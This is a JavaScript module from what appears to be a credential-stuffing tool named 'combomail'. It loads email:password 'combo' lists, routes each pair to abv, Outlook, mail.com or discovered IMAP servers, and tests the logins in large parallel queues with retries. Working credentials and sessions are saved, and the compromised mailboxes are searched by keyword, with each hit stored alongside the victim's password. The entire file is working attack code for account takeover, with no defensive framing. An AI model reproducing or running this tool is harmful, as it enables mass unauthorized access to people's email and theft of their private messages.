
import mail from '../conf/servers.js'

import datasource from './@data.js'

import abv from './abv.js'
import imap from './imap.js'
import mailcom from './mailcom.js'
import outlook from './outlook.js'

import factory from 'mailblazer'
import async from 'async'
import path from 'path'
import fs from 'fs'

import { debuffer, datadir } from 'konsole';

let debug = debuffer(datadir.share("combomail","logs")).logger("~mailserver");

const resolver = factory().resolve;

function loadsessions(){
	const { map, combo, userdata } = datasource.session.load() || { map: {}, combo: [], userdata: {} };
	
	map.combo = combo;
	map.valid = map.combo.length;
	map.create = function ({ user, pass, session }) {
		datasource.session.create({ user, pass, session });
		map[user] = session;
		map.combo.push(`${user}:${pass}`);
		map.valid ++;
	};
	map.update = function ({ user, data, session }) {
		datasource.session.update({ user, data, session });
		if (session) map[user] = session;
		userdata[user] = data;
	};
	map.delete = function({ user, pass }) {
		map[user] = undefined;
		userdata[user] = undefined;
		map.valid--;
		datasource.session.delete({ user, pass });
	}
	map.userdata = userdata
	return map
}

let sessions = loadsessions();

const servers = {
	abv: abv(sessions),
	outlook: outlook(sessions),
	mailcom: mailcom(sessions),
	imap: imap(sessions)
}

let running;
let comms;
let abort;
let stats = {
	total: 0,
	processed: 0,
	valid: 0,
	hits: 0
}

let runterm;
let hitlist = [];

function parseuser(lout) {
    let atdx = lout.indexOf("@")
    let btdx = lout.search(/[: |#]/)
    if (atdx > 0 && btdx > 0) {
        let user = lout.substr(0, btdx).toLowerCase();
        let pass = lout.substr(btdx+1);
        let domain = user.substr(atdx+1);
        return { user, domain, pass }
    } else return {}
}

function select(domain, email, tries) {
	return new Promise(resolve=>{
		
		let server = mail[domain];
		if (server) {
			if (server[1] === 143 || server[1] === 993) return resolve(servers.imap(server[0], server[1]));
			else resolve();

		} else if (servers.outlook.COMMONMISTAKES.includes(domain)) {
			resolve();
			
		} else if (servers.abv.DOMAINS.includes(domain)) {
			return resolve(servers.abv);

		} else if (servers.outlook.DOMAINS.includes(domain)) {
			return resolve(servers.outlook);

		} else if (servers.mailcom.DOMAINS.includes(domain)) {
			return resolve(servers.mailcom);

		} else {

			(function discover_mailserver(tries) {
				let cancelled = false;

				let timedout = setTimeout(function(){
					cancelled = true;

					if (tries < 3) {
						discover_mailserver(tries+1);
					} else {
						resolve();
					}
				}, 45000);

				resolver(domain, email).then(server=>{
					if (!cancelled) {
						if (server?.type === "imap") return resolve(servers.imap(server.hostname, server.port));
						else resolve();
					}
				})
			})(0)
		}
	})
}

function base({ pnid, action, term, combo }) {
	
	running = action;

	stats = {
		total: combo.length,
		processed: 0,
		valid: 0,
		hits: 0,
		running
	}

	function _q_(size){
		return async.queue((task, cb)=>{
			task(cb);
		},size);
	}
	
	const queue = {
		_triage_: _q_(100),
		main: _q_(100),
		outlook: _q_(20),
		abv: _q_(1)
	}

	let pending = [...combo];


	if (!pnid) {
		if (action === "combo") {
			pnid = datasource.combo.create(pending);
		} else {
			pnid = datasource.search.create(term, hitlist, pending)
		}
	}

	let deletes = [];
	let pendlock = false;
	let pendindex = 0;
	let pendintv = setInterval(savestatus,1000)
	let masterkill = false;

	function savestatus() {
		if (!pendlock) {
			pendlock = true;
			for (let d of deletes) {
				let i = pending.indexOf(d);
				pending.splice(i, 1);
			}

			pendindex++;
			if (action === "combo" && pendindex === 5) {
				pendindex = 0;
				datasource.combo.update(pnid, pending);
			} else if (action === "search" && pendindex === 10) {
				pendindex = 0;
				datasource.search.update(pnid, hitlist, pending);
			}

			pendlock = false;
		}
	}

	abort = ()=>{
		let startedsave = false;

		clearInterval(pendintv);

		if (queue) {
			for (let key in queue) {
				if (queue[key].started && !queue[key].idle()) queue[key].kill();
			}
		}

		(function suspend(){
			if (pendlock) {
				setTimeout(suspend,50);
			} else {
				if (!startedsave) {
					startedsave = true;
					savestatus();
					setTimeout(suspend,200);
				} else {
					process.exit(0);
				}
			}
		})()
	}

	function factory(domain, user, pass) {
		return async cb=>{
			select(domain).then(server=>{
				if (server) {
					queue[server.queue].push(cb2=>{
						(function execute(tries) {
							let cancelled = false;

							let timedout = setTimeout(function(){
								cancelled = true;

								if (tries < 3) {
									execute(tries+1)
								} else {
									cb2();
								}
							}, 60000);

							server.login(user, pass).then(async api => {
								clearTimeout(timedout);

								if (!cancelled) {
									if (api.success) {
										stats.valid++

										if (action === "search") {
											const list = await api.search(term);
											if (!list.error) {
												if (list.results.length > 0) {
													stats.hits++
													list.user = user;
													list.pass = pass;
													list.domain = domain;
													hitlist.push(list);

													if (comms) comms.hits(list);
												}
											} else  {
												debug.log(`Search Error (${server.name}):`, list.error);
											}
										}
									} else if (api.error){
										debug.log(`Login Error (${server.name}):`, api.error);
									}

									stats.processed++
									deletes.push(`${user}:${pass}`)
									cb2();
								}
							})
						})(0);
					})
					cb();
				} else {
					stats.processed++
					deletes.push(`${user}:${pass}`)
					cb();
				}
			})
		}
	}

	for (let entry of combo) {
		let { user, domain, pass } = parseuser(entry);
		if (user && domain && pass) {
			queue["_triage_"].push(factory(domain,user,pass));
		} else {
			stats.total--;
		}
	}

	const NOOP = (N=>{});

	queue["_triage_"].drain(function() {
		if (!masterkill) {
			let _started_ = [];
			
			if (queue.abv.started) _started_.push(queue.abv.drain());
			if (queue.outlook.started) _started_.push(queue.outlook.drain());
			if (queue.main.started) _started_.push(queue.main.drain());

			Promise.all(_started_).then(function(){
				clearInterval(pendintv);

				if (!masterkill) {
					if (action === "combo") {
						datasource.combo.delete(pnid);
					} else {
						hitlist.sort(function(a,b){
							return (a.results[0].date < b.results[0].date) ? -1:1
						})
						datasource.search.update(pnid, hitlist, []);
					}

					running = undefined;
					abort = undefined;

					if (comms) comms.finish();
				}
			})
		}
	});

	return {
		progress() {
			return stats;
		}
	}
}

let restart = datasource.search.incomplete();
if (restart) {
	hitlist = JSON.parse(restart.hits);
	hitlist.sort(function(a,b){
		return (a.results[0].date < b.results[0].date) ? -1:1
	})
	runterm = restart.term;
	base({
		prid: restart.id,
		combo: JSON.parse(restart.pending),
		term: restart.term,
		action: "search"
	})
} else {
	restart = datasource.combo.incomplete();
	if (restart) {
		base({
			prid: restart.id,
			combo: JSON.parse(restart.pending),
			action: "combo"
		})
	}
}

function ifneedtoabort() {
	if (abort) abort();
	else process.exit(0);
}

process.on("SIGINT", ifneedtoabort);
process.on("SIGHUP", ifneedtoabort);
process.on("SIGTERM", ifneedtoabort);
process.on("SIGBREAK", ifneedtoabort);

export default {
	combo({ combo }) {
		return base({ action: "combo", combo })
	},

	search({ term }) {
		hitlist = [];
		runterm = term;
		return base({ action: "search", combo: sessions.combo, term })
	},

	history({ term }) {
		let row = datasource.search.load(term);
		let hits = JSON.parse(row.hits);
		hits.sort(function(a,b){
			return (a.results[0].date < b.results[0].date) ? -1:1
		})
		return {
			action: "history",
			hits 
		}
	},

	list() {
		let data, list = datasource.search.list();
		if (list instanceof Array) {
			data = list;
		} else {
			data = [ list ];
		}
		return {
			action: "list",
		 	data
		}
	},

	qssess({ qssess }, sendstatus){
		return new Promise(resolve=>{
			let queue = [];
			
			let lastsend = -1;
			let imports = {
				action: "importing",
				total: qssess.length,
				processed: 0
			}

			for (let s of qssess) {
				queue.push(function(cb){
					try {
						let o = JSON.parse(s);
						datasource.session.import(o);
					} catch(e) {
						// Line Didn't Parse
					} finally {
						imports.processed++
						setTimeout(cb,2);
					}
				});
			}

			let isintv = setInterval(function(){
				if (imports.processed > lastsend) {
					lastsend = imports.processed;
					sendstatus(imports)
				}
			},250)

			async.series(queue, function(){
				clearInterval(isintv);

				sessions = loadsessions();
				resolve({
					action: "imported",
					valid: sessions.valid
				})
			})
		})
	},

	body(user, id) {
		return new Promise(async resolve=>{
			const domain = user.substr(user.indexOf("@")+1);
			const server = await select(domain);
			const api = await server.login(user);
			const body = await api.body(id);

			resolve(body);
		})
	},
	
	subsearch({ user, pass, domain, term }) {
		return new Promise(resolve=>{
			select(domain).then(server=>{
				if (server) {
					server.login(user, pass).then(async api => {
						if (api.success) {
							const list = await api.search(term);
							if (!list.error) {
								if (list.results.length > 0) {
									list.action = "subsearch";
									return resolve(list);
								}
							}
						}
						
						resolve({ error: "err" });
					})
				} else {
					resolve({ error: "no server" });
				}
			})
		})
	},

	begin() {
		let query, message = { 
			action: "begin",
			valid: sessions.valid 
		};
		if (running) {
			if (running === "search") {			
				message.running = running;
				message.hits = hitlist;
				message.term = runterm;
			}

			query = {
				progress() {
					return stats
				}
			}
		}
		return {
			message,
			query
		}
	},

	comms(opt){
		comms = opt;
	}
 }